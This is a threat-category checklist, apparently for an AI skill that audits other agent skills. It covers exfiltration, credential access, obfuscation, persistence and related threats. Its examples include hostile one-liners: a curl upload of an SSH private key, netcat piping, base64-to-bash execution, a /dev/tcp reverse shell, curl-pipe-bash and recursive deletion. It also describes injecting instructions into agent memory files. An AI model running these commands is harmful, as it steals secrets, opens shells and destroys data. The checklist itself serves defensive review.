# Threat Categories

Use this file as a checklist during Step 4 (Analyze Alignment). For each category, check whether the skill exhibits any of the described patterns and whether they are justified by stated intent.

**Convergence pattern**: In the wild, 100% of confirmed malicious skills combine malicious code with prompt injection simultaneously ([Snyk ToxicSkills research](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)). If you find one, look harder for the other.

## 1. Data Exfiltration

Sending local data to external endpoints without disclosure.

**Examples in skills**:
- `curl -X POST <url> -d @~/.ssh/id_rsa` — uploading sensitive files
- Piping file contents to network commands (`cat file | nc host port`)
- Reading local files and including contents in HTTP request bodies

**When legitimate**: API clients that upload user-specified data to disclosed endpoints. Deployment tools pushing build artifacts to known services.

## 2. Credential and Secret Access

Reading API keys, tokens, passwords, private keys, or credential stores.

**Examples in skills**:
- Accessing `~/.ssh/`, `~/.aws/credentials`, `~/.gnupg/`, `~/.config/gcloud/`
- Reading environment variables containing tokens (`$GITHUB_TOKEN`, `$AWS_SECRET_ACCESS_KEY`)
- Accessing password managers (`~/.password-store/`, keychain)

**When legitimate**: Deployment tools that need cloud credentials (disclosed). SSH tools that manage keys (stated purpose). Skills whose entire purpose is credential management.

## 3. Obfuscation and Evasion

Hiding what code actually does through encoding, indirection, or dynamic construction.

**Examples in skills**:
- `echo "base64string" | base64 -d | bash` — encoded command execution
- `eval $(cat hidden_script.sh)` — dynamic execution from files
- Variable indirection to construct commands at runtime
- Hex-encoded strings decoded and executed
- Comments or variable names that mislead about actual behavior
- Unicode tricks: homoglyph substitution, invisible characters, RTL override to disguise commands
- Password-protected archives (`unzip -P`) — specifically designed to evade automated scanning

**When legitimate**: Almost never. Base64 encoding of binary data for transport is fine. Base64 encoding of commands for execution is a strong red flag regardless of stated intent. Password-protected archives in a skill have no legitimate use case.

## 4. Destructive Operations

Deleting, overwriting, or corrupting files, directories, or system state.

**Examples in skills**:
- `rm -rf` on broad paths without confirmation
- `find / -delete` or recursive deletion patterns
- Overwriting files without backup
- `chmod 000` or permission destruction
- Truncating logs or databases

**When legitimate**: Cleanup tools (node_modules deleters, temp file cleaners, cache purgers) — but MUST be disclosed in description and scoped to specific targets.

## 5. Privilege Escalation

Gaining elevated permissions beyond what the skill should need.

**Examples in skills**:
- `sudo` commands without disclosure
- Modifying `/etc/sudoers` or PAM configuration
- Changing file ownership to gain access
- Exploiting setuid binaries

**When legitimate**: System administration skills that explicitly state they require root access for specific operations (package installation, service management).

## 6. Persistence Mechanisms

Installing hooks, modifying startup files, or creating scheduled tasks to maintain presence.

**Examples in skills**:
- Modifying `~/.bashrc`, `~/.zshrc`, `~/.profile`
- Creating cron jobs or systemd services
- Installing git hooks in repositories
- Modifying other skills' files
- Adding entries to `~/.claude/` configuration
- Modifying agent memory files (`~/.claude/memory/`, `CLAUDE.md`) to inject persistent instructions

**When legitimate**: Shell configuration skills that explicitly modify profiles. CI/CD skills that install git hooks (disclosed). Skills whose purpose is managing scheduled tasks.

## 7. Suspicious Network Activity

Network operations that are undisclosed, unexpected, or disproportionate to stated purpose.

**Examples in skills**:
- Connections to hardcoded IP addresses instead of domain names
- Contacting endpoints not mentioned in documentation
- Reverse shell patterns (`/bin/bash -i >& /dev/tcp/host/port`)
- DNS exfiltration or tunneling
- Telemetry or analytics without disclosure

**When legitimate**: API clients connecting to their documented endpoints. Tools that check for updates from their own repository. Network diagnostic tools (stated purpose).

## 8. Dynamic Code Execution

Constructing and executing code at runtime rather than using static, inspectable commands.

**Examples in skills**:
- `eval` with constructed strings
- `source` of downloaded scripts
- `curl <url> | bash` — download and execute
- Python `exec()` or `compile()` with dynamic input
- Node.js `eval()` or `Function()` constructors

**When legitimate**: Rarely. Build tools that source environment setup scripts (disclosed). Package managers that run install scripts (known behavior). Always a yellow flag requiring justification.

## 9. Supply Chain Attacks

Modifying other skills, injecting into dependency chains, or compromising the skill ecosystem.

**Examples in skills**:
- Writing to other skills' directories (`~/.agents/skills/other-skill/`)
- Modifying `package.json` or `requirements.txt` of other projects
- Postinstall scripts that modify the host environment
- Injecting code into shared configuration files
- Adding dependencies with known vulnerabilities

**When legitimate**: Skill managers or updaters whose stated purpose is managing other skills. Package managers operating on user-specified targets.

## 10. Code Vulnerability Patterns

Classic vulnerability patterns (OWASP) present in skill scripts or code.

**Examples in skills**:
- Command injection: unsanitized user input in shell commands
- Path traversal: user input used in file paths without validation
- SQL injection: if skill interacts with databases
- Insecure deserialization: `pickle.loads()`, `yaml.load()` without safe loader
- Hardcoded secrets: API keys, passwords, tokens in source code

**When legitimate**: These are bugs, not intentional threats — but they indicate low code quality and create exploitable attack surface. Note them as risks even in otherwise aligned skills.

*Pattern knowledge informed by droid-tings/security-auditor (ovachiever).*

## 11. Information Gathering and Reconnaissance

Collecting system, user, or environment information beyond what the stated purpose requires.

**Examples in skills**:
- Enumerating installed software, running processes, or open ports
- Reading `/etc/passwd`, `/etc/hosts`, or system configuration
- Collecting hostname, IP address, username, OS version
- Listing directory contents outside the skill's scope
- Reading browser history, cookies, or application data

**When legitimate**: System diagnostic tools (stated purpose). Security audit tools that need system context (this skill, for example). DevOps tools that inventory infrastructure.
